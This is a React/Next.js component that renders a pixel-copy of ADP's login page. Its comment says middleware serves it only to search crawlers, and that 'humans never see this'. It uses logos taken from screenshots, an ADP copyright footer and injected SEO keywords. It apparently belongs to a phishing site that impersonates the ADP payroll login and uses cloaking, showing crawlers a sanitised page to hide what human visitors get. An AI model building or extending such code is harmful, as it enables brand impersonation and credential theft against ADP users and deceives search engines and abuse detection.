import { MessageCircle } from "lucide-react"
import { PAGE_H1_HEADING } from "@/lib/seo-keywords"
import { SITE_DESCRIPTION, SITE_KEYWORDS } from "@/lib/seo-metadata"
import { SITE_DISPLAY_NAME } from "@/lib/site-url"
import adpLogo from "../adp_login/Screenshot 2026-07-06 122158.png"
import qrCode from "../adp_login/Screenshot 2026-07-06 125911.png"

/**
 * Static twin of the ADP login chrome for search crawlers.
 * Humans never see this — middleware sets x-crawler-seo-page for trusted bots.
 */
export default function CrawlerSeoPage() {
  return (
    <main
      className="min-h-screen flex flex-col relative overflow-x-hidden"
      style={{
        backgroundColor: "#f4f4f5",
        fontFamily:
          '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif',
      }}
    >
      <div className="flex-1 flex items-center justify-center p-5 relative z-[2]">
        <section
          className="bg-white w-full max-w-[500px] relative p-[30px_40px] max-[600px]:p-5"
          style={{
            borderRadius: 12,
            boxShadow: "0 4px 20px rgba(0, 0, 0, 0.08)",
          }}
          aria-label={`${SITE_DISPLAY_NAME} login`}
          data-purpose="login-card"
        >
          <div className="flex justify-between items-center mb-5">
            <span className="text-[#71717a] text-base" aria-hidden>
              🔒
            </span>
            <span className="text-[#0046be] text-sm font-medium">Languages ▾</span>
          </div>

          <div className="text-center mb-6">
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img
              src={adpLogo.src}
              alt={SITE_DISPLAY_NAME}
              className="mx-auto max-h-[55px] w-auto object-contain"
            />
          </div>

          <h1 className="text-center text-[22px] font-bold text-[#18181b] mb-6">
            {PAGE_H1_HEADING}
          </h1>
          <p className="text-center text-sm text-[#71717a] mb-6">{SITE_DESCRIPTION}</p>

          <div className="mb-5">
            <label htmlFor="crawler-userId" className="block text-[13px] font-semibold text-[#444] mb-1.5">
              User ID
            </label>
            <input
              id="crawler-userId"
              name="userId"
              type="text"
              disabled
              readOnly
              autoComplete="username"
              className="w-full p-3 text-base bg-white text-[#18181b] outline-none"
              style={{ border: "1.5px solid #0046be", borderRadius: 6 }}
            />

            <div className="mt-3">
              <label className="flex items-center gap-2 text-sm text-[#3f3f46]">
                <input type="checkbox" disabled className="w-[18px] h-[18px]" />
                Remember user ID
                <span
                  aria-hidden
                  className="inline-flex items-center justify-center bg-[#0046be] text-white rounded-full w-4 h-4 text-[11px] font-bold"
                >
                  ?
                </span>
              </label>
            </div>
          </div>

          <div
            className="flex justify-between items-center mt-[35px] pb-[25px]"
            style={{ borderBottom: "1px solid #e4e4e7" }}
          >
            <span className="text-[#0046be] underline text-[15px] font-medium">
              Need help signing in?
            </span>
            <button
              type="button"
              disabled
              className="text-white font-semibold text-[15px] px-8 py-3 opacity-80"
              style={{ backgroundColor: "#ccc6c0", borderRadius: 6 }}
            >
              Next
            </button>
          </div>

          <div className="text-center py-5">
            New user ? <span className="text-[#0046be] underline font-medium">Get started</span>
          </div>

          <div
            className="flex gap-[15px] items-start pt-5"
            style={{ borderTop: "1px solid #e4e4e7" }}
          >
            {/* eslint-disable-next-line @next/next/no-img-element */}
            <img
              src={qrCode.src}
              alt="QR Code"
              className="object-contain"
              style={{ width: 65, height: 65 }}
            />
            <div>
              <h3 className="text-sm text-[#18181b] mb-1">Download the ADP mobile app</h3>
              <p className="text-xs text-[#71717a] leading-snug mb-1.5">
                Scan the QR code with your device to begin. Secure and convenient tools right in
                your hands for simple, anytime access across devices.
              </p>
              <span className="text-[#0046be] text-xs font-bold">LEARN MORE →</span>
            </div>
          </div>
        </section>
      </div>

      {SITE_KEYWORDS.length > 0 ? (
        <p className="w-full max-w-[500px] mx-auto px-5 pb-8 text-sm leading-relaxed text-[#52525b] relative z-[2] break-words">
          Related searches: {SITE_KEYWORDS.join(", ")}
        </p>
      ) : null}

      <footer
        className="relative z-[2] flex justify-between gap-2.5 px-10 py-[15px] max-[600px]:flex-col max-[600px]:text-center text-xs text-[#52525b]"
        style={{ borderTop: "1px solid #e4e4e7", backgroundColor: "#f4f4f5" }}
      >
        <div className="flex gap-[15px] max-[600px]:gap-4 max-[600px]:justify-center">
          <span className="text-[#0046be] underline">PRIVACY</span>
          <span className="text-[#0046be] underline">LEGAL</span>
          <span className="text-[#0046be] underline">AI Transparency</span>
        </div>
        <div>© 2014-2026 ADP, Inc.</div>
      </footer>

      <div
        aria-hidden
        className="absolute bottom-0 right-0 w-[300px] h-[150px] z-[1] pointer-events-none"
        style={{ background: "linear-gradient(135deg, transparent 50%, #000040 50%)" }}
      />

      <button
        type="button"
        aria-label="Chat support"
        className="fixed bottom-4 right-4 w-12 h-12 sm:w-14 sm:h-14 rounded-full flex items-center justify-center shadow-lg z-50"
        style={{ backgroundColor: "#0099D8" }}
      >
        <MessageCircle className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
      </button>
    </main>
  )
}
